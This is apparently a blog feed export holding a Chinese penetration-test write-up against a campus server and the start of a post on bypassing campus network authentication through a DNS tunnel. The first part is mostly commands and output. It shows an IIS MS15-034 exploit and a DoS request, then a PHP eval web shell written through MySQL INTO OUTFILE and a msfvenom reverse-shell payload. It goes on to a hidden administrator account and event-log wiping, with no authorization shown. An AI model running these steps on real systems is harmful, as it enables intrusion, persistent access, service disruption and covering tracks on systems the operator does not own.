class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/http/ms15_034_http_sys_memory_dump</span><br><span class="line">msf5 auxiliary(scanner/http/ms15_034_http_sys_memory_dump) &gt; <span class="built_in">set</span> RHOSTS 192.168.3.72</span><br><span class="line">msf5 auxiliary(scanner/http/ms15_034_http_sys_memory_dump) &gt; <span class="built_in">set</span> RPORT 8082</span><br><span class="line">msf5 auxiliary(scanner/http/ms15_034_http_sys_memory_dump) &gt; <span class="built_in">set</span> TARGETURI /Images/top01.gif</span><br><span class="line">msf5 auxiliary(scanner/http/ms15_034_http_sys_memory_dump) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] Target may be vulnerable...</span><br><span class="line">[+] Stand by...</span><br><span class="line">[-] Memory dump start position not found, dumping all data instead</span><br><span class="line"></span><br><span class="line">[+] Memory contents:</span><br><span class="line">48 54 54 50 2f 31 2e 31 20 34 30 30 20 42 61 64    |HTTP/1.1 400 Bad|</span><br><span class="line">20 52 65 71 75 65 73 74 0d 0a 43 6f 6e 74 65 6e    | Request..Conten|</span><br><span class="line">74 2d 54 79 70 65 3a 20 74 65 78 74 2f 68 74 6d    |t-Type: text/htm|</span><br><span class="line">6c 3b 20 63 68 61 72 73 65 74 3d 75 73 2d 61 73    |l; charset=us-as|</span><br><span class="line">63 69 69 0d 0a 53 65 72 76 65 72 3a 20 4d 69 63    |cii..Server: Mic|</span><br><span class="line">… … … … … … … … …</span><br><span class="line">72 6f 73 6f 66 74 2d 48 54 54 50 41 50 49 2f 32    |rosoft-HTTPAPI/2|</span><br><span class="line">45 72 72 6f 72 20 34 30 30 2e 20 54 68 65 20 72    |Error 400. The r|</span><br><span class="line">65 71 75 65 73 74 20 68 6f 73 74 6e 61 6d 65 20    |equest hostname |</span><br><span class="line">69 73 20 69 6e 76 61 6c 69 64 2e 3c 2f 70 3e 0d    |is invalid.&lt;/p&gt;.|</span><br><span class="line">0a 3c 2f 42 4f 44 59 3e 3c 2f 48 54 4d 4c 3e 0d    |.&lt;/BODY&gt;&lt;/HTML&gt;.|</span><br><span class="line">0a                                                 |.|</span><br><span class="line">[+] Memory dump saved to ~/.msf4/loot/20190814122223_default_192.168.3.72_iis.ms15034_317502.bin</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>第二种，我直接使用 wget 命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget --header=<span class="string">&quot;Range: bytes=18-18446744073709551615&quot;</span> http://192.168.3.72/Images/top01.gif</span><br></pre></td></tr></table></figure><p>在敲这条命令时，双手一直是抖的🙃🙃。</p><p>这条命令回车下去直接对服务器造成 <strong>DoS</strong> 攻击，服务器必定<strong>假死</strong>或<strong>蓝屏</strong>；就不回车了……</p><p>此漏洞利用，就到此为止咯。。。</p><h2 id="0x02-由-phpMyAdmin-入手"><a href="#0x02-由-phpMyAdmin-入手" class="headerlink" title="0x02 由 phpMyAdmin 入手"></a>0x02 由 phpMyAdmin 入手</h2><p>还不甘心，难道仅仅只能让此服务器蓝屏重启吗？？？</p><p>得想想办法拿到最高控制权！！！</p><p>再次整理思路……</p><p>phpMyAdmin URL 主页：<a href="http://192.168.3.72:999/">http://192.168.3.72:999</a></p><h3 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h3><p>首先使用了 <strong>nikto</strong> 扫描了此站是否还有其他目录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ nikto -host http://192.168.3.72:999/ </span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.3.72</span><br><span class="line">+ Target Hostname:    192.168.3.72</span><br><span class="line">+ Target Port:        999</span><br><span class="line">+ Start Time:         2019-08-13 23:55:43 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.4.33 (Win32) OpenSSL/1.0.2o mod_fcgid/2.3.9 mod_jk/1.2.40</span><br><span class="line">+ Retrieved x-powered-by header: PHP/5.3.29</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ Uncommon header <span class="string">&#x27;x-ob_mode&#x27;</span> found, with contents: 0</span><br><span class="line">+ The X-Content-Type-Options header is not <span class="built_in">set</span>. This could allow the user agent to render the content of the site <span class="keyword">in</span> a different fashion to the MIME <span class="built_in">type</span></span><br><span class="line">+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x1a 0x4e4e67f49da00 </span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause <span class="literal">false</span> positives.</span><br><span class="line">+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx <span class="keyword">for</span> details.</span><br><span class="line">+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</span><br><span class="line">+ OSVDB-3092: /setup/: This might be interesting...</span><br><span class="line">+ OSVDB-3092: /README: README file found.</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ 8348 requests: 0 error(s) and 17 item(s) reported on remote host</span><br><span class="line">+ End Time:           2019-08-13 23:56:50 (GMT8) (67 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure><p>重点在 “**+ OSVDB-3092: &#x2F;setup&#x2F;: This might be interesting…**“，这一条。</p><p><strong>setup</strong> 没被关闭；由此判断管理员默认安装，这是很大的隐患。</p><p>如果管理员未对 phpmyadmin 目录下的 setup 文件进行安全处理，那普通用户可以在不进行身份认证的情况下，便可以配置服务器信息。</p><p><img src="/img/post/pentest-for-campus-server/phpmyadmin-setup.jpg" alt="phpmyadmin-setup"></p><p>在这里呢，直接反手新建了一个MySQL服务器。</p><p><img src="/img/post/pentest-for-campus-server/new-mysql-server.jpg" alt="new-mysql-server"></p><p>而且在认证页面发现缓存的密码（huweishen.com），根据密码可以猜测 phpMyAdmin 安装方式应该是此护卫神网站上的某款软件傻瓜式安装滴！</p><p>回到主页，未出意外地登录进去了。</p><h3 id="CVE-2016-5734"><a href="#CVE-2016-5734" class="headerlink" title="CVE-2016-5734"></a>CVE-2016-5734</h3><p>中间还有一个小插曲。找到一个 phpMyAdmin 需身份验证的远程代码执行漏洞。</p><p><a href="https://www.exploit-db.com/exploits/40185">CVE-2016-5734_POC</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./cve-2016-5734.py -c <span class="string">&#x27;system(ipconfig);&#x27;</span> -u root -p toor http://192.168.5.99:999/</span><br><span class="line">ERROR: </span><br><span class="line"><span class="comment">#1286 - Unknown storage engine &#x27;InnoDB&#x27;</span></span><br></pre></td></tr></table></figure><p>但是很不幸，MySQL 中未开启 InnoDB 引擎。而开启方法只能是编辑系统中 MySQL 的配置文件 my.cnf。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MySQL [(none)]&gt; show variables like &quot;%innodb%&quot;;</span><br><span class="line">+-----------------------+----------+</span><br><span class="line">| Variable_name         | Value    |</span><br><span class="line">+-----------------------+----------+</span><br><span class="line">| have_innodb           | DISABLED |</span><br><span class="line">| ignore_builtin_innodb | OFF      |</span><br><span class="line">+-----------------------+----------+</span><br><span class="line">2 rows in set (0.002 sec)</span><br></pre></td></tr></table></figure><p>CVE-2016-5734 利用失败。。。</p><h3 id="寻绝对路径，外写木马"><a href="#寻绝对路径，外写木马" class="headerlink" title="寻绝对路径，外写木马"></a>寻绝对路径，外写木马</h3><p>经测试发现，MySQL 中，<strong>into outfile</strong> 未被禁用，而且这里也不存在 WAF 拦截；root 用户拥有<strong>向外写文件</strong>的权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MySQL [(none)]&gt; SELECT @@global.secure_file_priv;</span><br><span class="line">+---------------------------+</span><br><span class="line">| @@global.secure_file_priv |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                           |</span><br><span class="line">+---------------------------+</span><br><span class="line">1 row in set (0.001 sec)</span><br></pre></td></tr></table></figure><p>再查询未使用 <strong>secure-file-priv</strong> 参数；这说明不仅能向外写文件，而且想往哪里写就往哪儿写。</p><p>所以，只需找到 Web 物理路径；使用 SQL 语句向 Web 目录写个<strong>一句话木马</strong>，就能拿到服务器的 <strong>shell</strong>。</p><p>首先先判断当前 MySQL 的数据、插件等目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">MySQL [(none)]&gt; show variables like &quot;%dir%&quot;;</span><br><span class="line">+-----------------------------------------+------------------------------------------+</span><br><span class="line">| Variable_name                           | Value                                    |</span><br><span class="line">+-----------------------------------------+------------------------------------------+</span><br><span class="line">| basedir                                 | D:/HwsApacheMaster/mysql/                |</span><br><span class="line">| binlog_direct_non_transactional_updates | OFF                                      |</span><br><span class="line">| character_sets_dir                      | D:\HwsApacheMaster\mysql\share\charsets\ |</span><br><span class="line">| datadir                                 | D:\HwsApacheMaster\mysql\Data\           |</span><br><span class="line">| lc_messages_dir                         | D:\HwsApacheMaster\mysql\share\          |</span><br><span class="line">| plugin_dir                              | D:\HwsApacheMaster\mysql\lib/plugin      |</span><br><span class="line">| slave_load_tmpdir                       | C:\Users\MYSQL_~1.005\AppData\Local\Temp |</span><br><span class="line">| tmpdir                                  | C:\Users\MYSQL_~1.005\AppData\Local\Temp |</span><br><span class="line">+-----------------------------------------+------------------------------------------+</span><br><span class="line">8 rows in set (0.002 sec)</span><br></pre></td></tr></table></figure><p>发现 <strong>D:\</strong> 下一个有趣的目录 <strong>HwsApacheMaster</strong>，仅此而已。</p><p>此时把精力转向 Web 页面；打算在网页上瞎乱试，指望 Web Application 程序出错，大力出奇迹般的报错将 Web 物理路径爆出来。绞尽脑汁地让程序报错；可惜，并没有。。。</p><p>思考许久……思路来了。</p><p>前面通过浏览器缓存发现的那个密码（<strong>huweishen.com</strong>）很有意思，通过这个密码可以发现，phpMyAdmin 是管理员<strong>默认安装</strong>的；灵光一现，直接去这个网站下载这个傻瓜式一键安装的软件（<strong>护卫神</strong>），<strong>安装至本地测试</strong>，不就知道了物理路径了嘛！！！</p><p>这款软件叫做【<strong>护卫神·Apache大师</strong>】；安装一整套环境至本地，发现目录结构如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">├── D:/</span><br><span class="line">│   ├── HwsApacheMaster</span><br><span class="line">│   │   ├── phpmyadmin</span><br><span class="line">│   │   │   ├── web</span><br><span class="line">│   │   │   |    ├── libraries</span><br><span class="line">│   │   │   |    ├── database</span><br><span class="line">│   │   │   |    ├── doc</span><br><span class="line">│   │   │   |    ├── js</span><br><span class="line">│   │   │   |    ├── setup</span><br><span class="line">│   │   │   |    ├── themes</span><br><span class="line">│   │ ├── Apache2.2</span><br><span class="line">│   │ ├── Tomcat8</span><br><span class="line">│   │ ├── mysql</span><br><span class="line">│   │ ├── Java</span><br><span class="line">│   │ ├── php</span><br><span class="line">… … … … …</span><br></pre></td></tr></table></figure><p>此时很明确了，直接一句话木马写至某目录；还有注意转义符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MySQL [(none)]&gt; select &quot;&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt;&quot; into outfile &#x27;D:\\HwsApacheMaster\\phpMyAdmin\\web\\she11.php&#x27;;</span><br><span class="line">Query OK, 1 row affected (0.002 sec)</span><br></pre></td></tr></table></figure><p>然后，就可以使用<strong>菜刀</strong>等 shell 连接工具与木马进行连接；连接密码为 <strong>a</strong> 。</p><h2 id="0x03-后渗透测试"><a href="#0x03-后渗透测试" class="headerlink" title="0x03 后渗透测试"></a>0x03 后渗透测试</h2><h3 id="中国蚁剑"><a href="#中国蚁剑" class="headerlink" title="中国蚁剑"></a>中国蚁剑</h3><p>由于菜刀只能在Windows上使用，而我操作系统为 Linux，使用的是另一款 shell 连接工具 <strong><a href="https://github.com/AntSwordProject/antSword">AntSword(蚁剑)</a></strong> ， 开源、跨平台的网站（shell）管理工具。</p><p><img src="/img/post/pentest-for-campus-server/antsword.jpg" alt="antsword"></p><p>连接上去后，进入终端，输入 <strong>cmd</strong> 命令会发现无法执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\HwsApacheMaster\phpmyadmin\web&gt; whoami</span><br><span class="line">ret=127</span><br></pre></td></tr></table></figure><p>这说明，php 配置文件 <strong>php.ini</strong> 中将一些危险函数给禁用掉了，即 <strong>disable_functions</strong>。将此项删除，清理一下缓存，便可以执行 cmd 了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\HwsApacheMaster\phpmyadmin\web&gt; whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure><p>哇！<strong>system</strong> 权限。可是比 <strong>Administrator</strong> 管理员用户权限还要大，这也省的我之后的<strong>提权</strong>了。</p><h3 id="连接-Metasploit"><a href="#连接-Metasploit" class="headerlink" title="连接 Metasploit"></a>连接 Metasploit</h3><p>由于菜刀、蚁剑这类工具功能相比于 <strong>MSF</strong> 功能比较欠缺，所以我要再次生成一个木马用来<strong>反弹 shell</strong> 连接 <strong>MSF</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.5.23 LPORT=4444 -f exe -o she11.exe</span><br><span class="line">参数：</span><br><span class="line">    --platform  平台</span><br><span class="line">    -p             payload，有效载荷</span><br><span class="line">    LHOST        本地IP</span><br><span class="line">    LPORT        本地端口</span><br><span class="line">    -f            生成文件类型</span><br><span class="line">    -o            输出文件名</span><br></pre></td></tr></table></figure><p>将生成的木马通过蚁剑传至服务器上一个有执行权限的目录；虽然我和服务器并不在一个网段（本以为要做内网穿透的），但防火墙为<strong>关闭</strong>状态，依旧能够建立连接。</p><p>首先，MSF 先在本地侦听着4444端口，等着 shell 反弹回来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LHOST 192.168.5.23</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LPORT 4444</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit </span><br><span class="line">[*] Started reverse TCP handler on 192.168.5.23:4444</span><br></pre></td></tr></table></figure><p>然后使用蚁剑，在 CMD 终端中执行刚刚生成的那个木马文件（she11.exe）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32&gt; C:/Windows/System32/she11.exe</span><br></pre></td></tr></table></figure><p>回车执行这个 <strong>exe</strong> 后，在 MSF 这边就会生成一个 <strong>meterpreter</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] Started reverse TCP handler on 192.168.5.23:4444 </span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.3.72</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.5.23:4444 -&gt; 192.168.3.72:55580) at 2019-08-14 17:59:57 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p><code>getuid</code> 获取当前用户，还是 <strong>SYSTEM</strong> 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p>开启远程 <strong>RDP</strong> 连接。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/enable_rdp</span><br><span class="line">[*] Enabling Remote Desktop</span><br><span class="line">[*]     RDP is already enabled</span><br><span class="line">[*] Setting Terminal Services service startup mode</span><br><span class="line">[*]     Terminal Services service is already set to auto</span><br><span class="line">[*]     Opening port in local firewall if necessary</span><br><span class="line">[*] For cleanup execute Meterpreter resource file: ~/.msf4/loot/20190814180610_default_192.168.3.72_host.windows.cle_307378.txt</span><br></pre></td></tr></table></figure><p>查看刚刚开启 RDP 执行的具体命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat ~/.msf4/loot/20190814180610_default_192.168.3.72_host.windows.cle_307378.txt                </span><br><span class="line">execute -H -f cmd.exe -a &quot;/c &#x27;netsh firewall set service type = remotedesktop mode = enable&#x27;&quot;</span><br></pre></td></tr></table></figure><p>进入 <strong>CMD</strong> 模式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 7116 created.</span><br><span class="line">Channel 3 created.</span><br><span class="line">Microsoft Windows [版本 6.1.7600]</span><br><span class="line">版权所有 (c) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line">C:\Windows\System32&gt;</span><br></pre></td></tr></table></figure><p>查看当前所有用户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32&gt;net user </span><br><span class="line">\\ 的用户帐户</span><br><span class="line">---------------------------------------------------------</span><br><span class="line">Administrator            Guest                    mysql           </span><br><span class="line">MySQL_HWS                www                      </span><br></pre></td></tr></table></figure><p>创建一个隐藏用户（Windows中在用户名后带上<strong>$</strong>即为隐藏用户，仅是简单隐藏），并拉入管理员用户组，查看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32&gt;net user she11$ D@i123 /add</span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt;net localgroup administrators she11$ /add</span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt;net user she11$</span><br><span class="line">用户名                 she11$</span><br><span class="line">全名                   </span><br><span class="line">注释                   </span><br><span class="line">用户的注释             </span><br><span class="line">国家/地区代码          000 (系统默认值)</span><br><span class="line">帐户启用               Yes</span><br><span class="line">帐户到期               从不</span><br><span class="line">上次设置密码           2019/8/14 0:30:02</span><br><span class="line">密码到期               2019/9/25 0:30:02</span><br><span class="line">密码可更改             2019/8/14 0:30:02</span><br><span class="line">需要密码               Yes</span><br><span class="line">用户可以更改密码       Yes</span><br><span class="line">允许的工作站           All</span><br><span class="line">登录脚本               </span><br><span class="line">用户配置文件           </span><br><span class="line">主目录                 </span><br><span class="line">上次登录               2019/8/14 0:44:40</span><br><span class="line">可允许的登录小时数     All</span><br><span class="line">本地组成员             *Administrators       *Users               </span><br><span class="line">全局组成员             *None                 </span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><p>完成后，直接登录到服务器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rdesktop 192.168.3.72 -u she11$ -p D@i123 -g 1024x960</span><br></pre></td></tr></table></figure><p><img src="/img/post/pentest-for-campus-server/rdesktop.jpg" alt="rdesktop"></p><p>此过程中难免会留下日志信息痕迹，使用此命令来清理日志。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; clearev </span><br><span class="line">[*] Wiping 16000 records from Application...</span><br><span class="line">[*] Wiping 20128 records from System...</span><br><span class="line">[*] Wiping 18688 records from Security...</span><br></pre></td></tr></table></figure><p>介于这台主机在一个单独的内网，后渗透的意义不大。所以就此完了。。。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pentest </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS隧道绕过校园网认证</title>
      <link href="/Bypass-campusNet.html"/>
      <url>/Bypass-campusNet.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#%E5%9C%BA%E6%99%AF%E5%88%86%E6%9E%90">场景分析</a><ul><li><a href="#%E5%90%90%E6%A7%BD">吐槽</a></li><li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li><li><a href="#%E5%8E%9F%E7%90%86%E7%AE%80%E8%BF%B0">原理简述</a></li></ul></li><li><a href="#%E5%BC%80%E5%A7%8B%E5%AE%9E%E6%88%98">开始实战</a><ul><li><a href="#%E6%89%80%E9%9C%80">所需</a></li><li><a href="#%E4%BC%AA%E8%A3%85%E7%A8%8B%E5%BA%8F">伪装程序</a></li><li><a href="#%E6%9C%8D%E5%8A%A1%E5%99%A8">服务器</a></li><li><a href="#%E5%AE%A2%E6%88%B7%E7%AB%AF">客户端</a></li><li><a href="#%E4%BB%A3%E7%90%86">代理</a></li><li><a href="#%E6%B5%8B%E8%AF%95">测试</a></li></ul></li><li><a href="#%E8%B4%A8%E9%87%8F">质量</a><ul><li><a href="#%E5%85%B3%E4%BA%8E%E7%BD%91%E9%80%9F">关于网速</a></li><li><a href="#%E6%9C%AA%E9%81%B5%E5%BE%AA%E6%A0%87%E5%87%86%E7%9A%84%E7%BB%93%E6%9E%9C">未遵循标准的结果</a></li><li><a href="#Reference">Reference</a></li></ul></li></ul><blockquote><p>本文在绝大数人眼里或许是篇福利文；在此文中介绍如何通过 DNS TUNNEL 的方式来绕过校园网认证，实现免认证<del>免费</del>上网；或许此招式并不是最优解，但对于绝大多数校园认证网确实能够成功实现。</p><p>怎么说呢！其实我早盯上了校园网了。</p></blockquote><h2 id="场景分析"><a href="#场景分析" class="headerlink" title="场景分析"></a>场景分析</h2><h3 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h3><p>在某所高校中，存在一家网络运营商，主要面向毫无收入的学生们，为我们提供日常上网冲浪。</p><p>其特点就是三字：<strong>贵</strong>、<strong>差</strong>、<strong>抠</strong>。每月79RMB的高昂费用；网络质量差，打游戏经常<code>460</code>；还只让三个设备使用。</p><p>没办法，我虽不用此校园网，但还是看不下去，遂有了本文。</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>在这所高校的网络中，统一使用的是 WiFi 热点客户端认证方式；当连上 WiFi 后，本机会向 DHCP 服务器获取一个内网 IP；关于这个 IP 地址，起初还让我很是疑惑，没想到在资源如此匮乏的大天朝，此运营商还会分一个公网 IP 给俺；</p><p><img src="/img/post/Bypass-campusNet/ipa.jpg" alt="ip-a"></p><p>后来才知道这是个保留地址，详见其 <a href="https://en.wikipedia.org/wiki/Reserved_IP_addresses">维基百科</a> 。</p><table><thead><tr><th>Address block</th><th>Scope</th><th>Description</th></tr></thead><tbody><tr><td>100.64.0.0&#x2F;10</td><td>私有网络</td><td><a href="https://en.wikipedia.org/wiki/IPv4_shared_address_space">共享地址空间</a></td></tr></tbody></table><p>在未认证前还会弹出一个下载认证客户端软件的页面，这里所用到的恶心技术就是利用 HTTP 协议的缺陷，当我们访问一个 HTTP 的网站时，网关会对这个响应报文劫持篡改，给我们302重定向到一个指定的下载认证客户端页面。而当我们打开一个 HTTPS 类型的网站是不可能被劫持的。</p><p><img src="/img/post/Bypass-campusNet/campus.png"></p><p>上图就是重定向后的客户端下载页面，让我匪夷所思的是最上面的那个位置本该是一个域名，为何是个公网 IP。既然没有使用域名，那何必需要 DNS，何不直接关闭53端口，为何让我如此这般有机可乘；实在让我百思不得其解🤔。</p><p>由下图可得知，DNS 53端口是开启的。</p><p><img src="/img/post/Bypass-campusNet/nslookup.jpg" alt="nslookup"></p><h3 id="原理简述"><a href="#原理简述" class="headerlink" title="原理简述"></a>原理简述</h3><p>原理其实很简单。由上述信息得知，校园网认证过程一般需要放行 DNS 和 DHCP 报文，也就是53和67&#x2F;68端口。53端口既可以是 UDP，也可是 TCP；67&#x2F;68端口走的是 UDP 传输协议。</p><p>本文着重点是 DNS 53端口，其实 UDP 67也可以绕过认证；但本文将围绕 DNS 53来实现绕过认证，不讨论后者。</p><p>而在这个53端口中，网关&#x2F;防火墙如果不进行报文检查，那么就也将意味着，任何数据包都可以通过此端口传输；如果真的是这样的话，那就很简单了，直接 openVPN 架起，详见此文 <a href="http://zgao.top/2019/03/03/%E5%88%A9%E7%94%A8openvpn%E5%AE%9E%E7%8E%B0udp536768%E7%AB%AF%E5%8F%A3%E7%BB%95%E8%BF%87%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%AE%A4%E8%AF%81%E4%B8%8A%E7%BD%91/">利用openVPN实现udp53,67,68端口绕过校园网认证上网</a> 。</p><p>但是，恰巧不幸的是，这种情况是很少存在的，也就是说53端口仅只允许 DNS 报文通过。如果是这种情况，还是有办法的。办法就是，使用 DNS 隧道。</p><p>简单来讲，既然53端口的 DNS 数据包可以通过网关&#x2F;防火墙，那么就可以在本机运行一个程序，用来将其他端口数据包伪装成 DNS 数据包，发送到本地 DNS 服务器，这样网关&#x2F;防火墙也不会进行拦截。但是这样仅只是将数据发送出去，如何回来呢？回来需要两个东西，一个是 VPS ，另一个就是域名。还得在域名购买商那里做如下解析设置：</p><table><thead><tr><th>主机记录</th><th>类型</th><th>值</th></tr></thead><tbody><tr><td>NS</td><td>d2t</td><td>tunnel.0xf4n9x.com</td></tr><tr><td>A</td><td>tunnel</td><td>47.73.228.119</td></tr></tbody></table><p>以上，d2t 和 tunnel 可以随意命名；另外，VPS 公网 IP 为47.73.228.119。还有一点就是 VPS 是某马家的学生云，在此文发布之后，或可能未续费而停掉。意思就是说，不要想着搞我服务器了，虽然公网 IP 暴露了。</p><p>然后步入正题做个假设，我们在本机 PC 上将数据包伪装成 DNS 数据，且向本地 DNS 